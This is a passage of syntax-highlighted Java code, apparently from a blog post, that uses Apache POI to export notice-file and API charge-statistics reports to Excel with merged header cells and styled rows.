<span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                BatchNoticeFileData noticeFileData <span class="token operator">=</span> list<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> k <span class="token operator">&lt;</span> title<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> k<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    HSSFCell cell <span class="token operator">=</span> contentRow<span class="token punctuation">.</span><span class="token function">createCell</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">switch</span> <span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token keyword">case</span> <span class="token number">0</span><span class="token operator">:</span>                            cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                        <span class="token keyword">case</span> <span class="token number">1</span><span class="token operator">:</span>                            <span class="token keyword">if</span> <span class="token punctuation">(</span>StringUtils<span class="token punctuation">.</span><span class="token function">isNotBlank</span><span class="token punctuation">(</span>noticeFileData<span class="token punctuation">.</span><span class="token function">getEntName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>noticeFileData<span class="token punctuation">.</span><span class="token function">getEntName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span>                            cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>noticeFileData<span class="token punctuation">.</span><span class="token function">getEntName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                        <span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span>                            <span class="token keyword">if</span> <span class="token punctuation">(</span>StringUtils<span class="token punctuation">.</span><span class="token function">isNotBlank</span><span class="token punctuation">(</span>noticeFileData<span class="token punctuation">.</span><span class="token function">getEntSocialCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>noticeFileData<span class="token punctuation">.</span><span class="token function">getEntSocialCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                        <span class="token keyword">case</span> <span class="token number">3</span><span class="token operator">:</span>                            <span class="token keyword">if</span> <span class="token punctuation">(</span>noticeFileData<span class="token punctuation">.</span><span class="token function">getId</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>noticeFileData<span class="token punctuation">.</span><span class="token function">getId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                        <span class="token keyword">default</span><span class="token operator">:</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    cell<span class="token punctuation">.</span><span class="token function">setCellStyle</span><span class="token punctuation">(</span>cellStyle<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token function">writeExcelIo</span><span class="token punctuation">(</span>response<span class="token punctuation">,</span> workbook<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">exportChargeReportExcel</span><span class="token punctuation">(</span>HttpServletResponse response<span class="token punctuation">,</span> List<span class="token operator">&lt;</span>ExportChargeReportVo<span class="token operator">></span> list<span class="token punctuation">,</span> ExportChargeReportReq req<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span> title <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            title<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"tab0"</span><span class="token punctuation">,</span> <span class="token string">"搜索条"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            title<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"tab1"</span><span class="token punctuation">,</span> <span class="token string">"客户名称"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            title<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"tab2"</span><span class="token punctuation">,</span> <span class="token string">"产品编码"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            title<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"tab3"</span><span class="token punctuation">,</span> <span class="token string">"产品名称"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            title<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"count0"</span><span class="token punctuation">,</span> <span class="token string">"今年累计"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            title<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"count1"</span><span class="token punctuation">,</span> <span class="token string">"所有累计"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            title<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"subtab3"</span><span class="token punctuation">,</span> <span class="token string">"请求数量"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            title<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"subtab4"</span><span class="token punctuation">,</span> <span class="token string">"计费请求数量"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            title<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"subtab5"</span><span class="token punctuation">,</span> <span class="token string">"不计费请求数量"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            title<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"subtab6"</span><span class="token punctuation">,</span> <span class="token string">"请求数量"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            title<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"subtab7"</span><span class="token punctuation">,</span> <span class="token string">"计费请求数量"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            title<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"subtab8"</span><span class="token punctuation">,</span> <span class="token string">"不计费请求数量"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 创建Excel的工作书册 Workbook,对应到一个excel文档</span>            HSSFWorkbook workbook <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HSSFWorkbook</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            HSSFCellStyle style <span class="token operator">=</span> workbook<span class="token punctuation">.</span><span class="token function">createCellStyle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 生成一个字体</span>            HSSFFont font <span class="token operator">=</span> workbook<span class="token punctuation">.</span><span class="token function">createFont</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 字体增粗</span>            <span class="token comment" spellcheck="true">//font.setBoldweight(HSSFFont.BOLDWEIGHT_BOLD);</span>            font<span class="token punctuation">.</span><span class="token function">setFontHeightInPoints</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">short</span><span class="token punctuation">)</span> <span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            style<span class="token punctuation">.</span><span class="token function">setFont</span><span class="token punctuation">(</span>font<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 创建Excel的工作sheet,对应到一个excel文档的tab</span>            HSSFSheet sheet <span class="token operator">=</span> workbook<span class="token punctuation">.</span><span class="token function">createSheet</span><span class="token punctuation">(</span><span class="token string">"接口调用情况统计"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 表头内容填充</span>            <span class="token comment" spellcheck="true">// 创建Excel的sheet的一行 (表头)</span>            HSSFRow row <span class="token operator">=</span> sheet<span class="token punctuation">.</span><span class="token function">createRow</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 创建Excel的sheet的第二行</span>            HSSFRow row1 <span class="token operator">=</span> sheet<span class="token punctuation">.</span><span class="token function">createRow</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 搜索条 客户名称 产品名称</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">5</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                HSSFCell cell <span class="token operator">=</span> null<span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    cell <span class="token operator">=</span> row<span class="token punctuation">.</span><span class="token function">createCell</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>                    cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>title<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"tab"</span> <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                    cell <span class="token operator">=</span> row1<span class="token punctuation">.</span><span class="token function">createCell</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>                    cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span><span class="token function">getUserName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    cell <span class="token operator">=</span> row1<span class="token punctuation">.</span><span class="token function">createCell</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>                    cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span><span class="token function">getProductName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                    cell <span class="token operator">=</span> row1<span class="token punctuation">.</span><span class="token function">createCell</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>                    cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>title<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"tab"</span> <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                cell<span class="token punctuation">.</span><span class="token function">setCellStyle</span><span class="token punctuation">(</span>style<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            HSSFCellStyle styleBt <span class="token operator">=</span> workbook<span class="token punctuation">.</span><span class="token function">createCellStyle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            HSSFFont fontBt <span class="token operator">=</span> workbook<span class="token punctuation">.</span><span class="token function">createFont</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 字体增粗</span>            fontBt<span class="token punctuation">.</span><span class="token function">setBold</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            fontBt<span class="token punctuation">.</span><span class="token function">setFontHeightInPoints</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">short</span><span class="token punctuation">)</span> <span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            fontBt<span class="token punctuation">.</span><span class="token function">setColor</span><span class="token punctuation">(</span>IndexedColors<span class="token punctuation">.</span>WHITE<span class="token punctuation">.</span><span class="token function">getIndex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            styleBt<span class="token punctuation">.</span><span class="token function">setFont</span><span class="token punctuation">(</span>fontBt<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//设置样式对齐方式：水平垂直居中</span>            styleBt<span class="token punctuation">.</span><span class="token function">setAlignment</span><span class="token punctuation">(</span>HorizontalAlignment<span class="token punctuation">.</span>CENTER<span class="token punctuation">)</span><span class="token punctuation">;</span>            styleBt<span class="token punctuation">.</span><span class="token function">setVerticalAlignment</span><span class="token punctuation">(</span>VerticalAlignment<span class="token punctuation">.</span>CENTER<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//设定填充单色</span>            styleBt<span class="token punctuation">.</span><span class="token function">setFillPattern</span><span class="token punctuation">(</span>FillPatternType<span class="token punctuation">.</span>SOLID_FOREGROUND<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//设定背景颜色</span>            styleBt<span class="token punctuation">.</span><span class="token function">setFillForegroundColor</span><span class="token punctuation">(</span>IndexedColors<span class="token punctuation">.</span>PALE_BLUE<span class="token punctuation">.</span><span class="token function">getIndex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//            this.setBorderColor(styleBt, IndexedColors.BLACK.getIndex(), BorderStyle.MEDIUM);</span>            <span class="token comment" spellcheck="true">//创建行，指定起始行号，从0开始</span>            HSSFRow row2 <span class="token operator">=</span> sheet<span class="token punctuation">.</span><span class="token function">createRow</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 客户名称 产品编码 产品名称 合并单元格</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                sheet<span class="token punctuation">.</span><span class="token function">autoSizeColumn</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>                sheet<span class="token punctuation">.</span><span class="token function">setColumnWidth</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">6000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">//指定合并开始行、合并结束行 合并开始列、合并结束列</span>                CellRangeAddress rangeAddress <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CellRangeAddress</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> i<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">//添加要合并地址到表格</span>                sheet<span class="token punctuation">.</span><span class="token function">addMergedRegion</span><span class="token punctuation">(</span>rangeAddress<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">//创建单元格，指定起始列号，从0开始</span>                HSSFCell cell <span class="token operator">=</span> row2<span class="token punctuation">.</span><span class="token function">createCell</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">//设置单元格内容</span>                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>title<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"tab"</span> <span class="token operator">+</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                cell<span class="token punctuation">.</span><span class="token function">setCellStyle</span><span class="token punctuation">(</span>styleBt<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token comment" spellcheck="true">// 今年累计  所有累计  合并单元格</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">//指定合并开始行、合并结束行 合并开始列、合并结束列</span>                CellRangeAddress rangeAddress <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CellRangeAddress</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> i <span class="token operator">*</span> <span class="token number">3</span> <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">,</span> i <span class="token operator">*</span> <span class="token number">3</span> <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">//添加要合并地址到表格</span>                sheet<span class="token punctuation">.</span><span class="token function">addMergedRegion</span><span class="token punctuation">(</span>rangeAddress<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">//创建单元格，指定起始列号，从0开始</span>                HSSFCell cell <span class="token operator">=</span> row2<span class="token punctuation">.</span><span class="token function">createCell</span><span class="token punctuation">(</span>i <span class="token operator">*</span> <span class="token number">3</span> <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">//设置单元格内容</span>                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>title<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"count"</span> <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                cell<span class="token punctuation">.</span><span class="token function">setCellStyle</span><span class="token punctuation">(</span>styleBt<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            HSSFRow row3 <span class="token operator">=</span> sheet<span class="token punctuation">.</span><span class="token function">createRow</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 请求数量 计费请求数量 不计费请求数量</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">9</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// 设置excel每列宽度</span>                sheet<span class="token punctuation">.</span><span class="token function">autoSizeColumn</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>                sheet<span class="token punctuation">.</span><span class="token function">setColumnWidth</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">6000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                HSSFCell cell <span class="token operator">=</span> row3<span class="token punctuation">.</span><span class="token function">createCell</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>title<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"subtab"</span> <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                cell<span class="token punctuation">.</span><span class="token function">setCellStyle</span><span class="token punctuation">(</span>styleBt<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token comment" spellcheck="true">// 创建内容行</span>            HSSFCellStyle cellStyle <span class="token operator">=</span> workbook<span class="token punctuation">.</span><span class="token function">createCellStyle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            cellStyle<span class="token punctuation">.</span><span class="token function">setWrapText</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 自动换行</span>            font<span class="token punctuation">.</span><span class="token function">setFontHeightInPoints</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">short</span><span class="token punctuation">)</span> <span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            cellStyle<span class="token punctuation">.</span><span class="token function">setFont</span><span class="token punctuation">(</span>font<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> list<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                HSSFRow contentRow <span class="token operator">=</span> sheet<span class="token punctuation">.</span><span class="token function">createRow</span><span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                ExportChargeReportVo chargeReport <span class="token operator">=</span> list<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> k <span class="token operator">&lt;</span> <span class="token number">9</span><span class="token punctuation">;</span> k<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    HSSFCell cell <span class="token operator">=</span> contentRow<span class="token punctuation">.</span><span class="token function">createCell</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">switch</span> <span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token keyword">case</span> <span class="token number">0</span><span class="token operator">:</span>                            <span class="token keyword">if</span> <span class="token punctuation">(</span>StringUtils<span class="token punctuation">.</span><span class="token function">isNotBlank</span><span class="token punctuation">(</span>chargeReport<span class="token punctuation">.</span><span class="token function">getReportAccountName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>chargeReport<span class="token punctuation">.</span><span class="token function">getReportAccountName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                        <span class="token keyword">case</span> <span class="token number">1</span><span class="token operator">:</span>                            <span class="token keyword">if</span> <span class="token punctuation">(</span>StringUtils<span class="token punctuation">.</span><span class="token function">isNotBlank</span><span class="token punctuation">(</span>chargeReport<span class="token punctuation">.</span><span class="token function">getReportDataCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>chargeReport<span class="token punctuation">.</span><span class="token function">getReportDataCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                        <span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span>                            <span class="token keyword">if</span> <span class="token punctuation">(</span>StringUtils<span class="token punctuation">.</span><span class="token function">isNotBlank</span><span class="token punctuation">(</span>chargeReport<span class="token punctuation">.</span><span class="token function">getReportDataName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>chargeReport<span class="token punctuation">.</span><span class="token function">getReportDataName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                        <span class="token keyword">case</span> <span class="token number">3</span><span class="token operator">:</span>                            <span class="token keyword">if</span> <span class="token punctuation">(</span>chargeReport<span class="token punctuation">.</span><span class="token function">getReportNum</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>chargeReport<span class="token punctuation">.</span><span class="token function">getReportNum</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                        <span class="token keyword">case</span> <span class="token number">4</span><span class="token operator">:</span>                            <span class="token keyword">if</span> <span class="token punctuation">(</span>chargeReport<span class="token punctuation">.</span><span class="token function">getReportFeeNum</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>chargeReport<span class="token punctuation">.</span><span class="token function">getReportFeeNum</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">"-"</span><span class="token 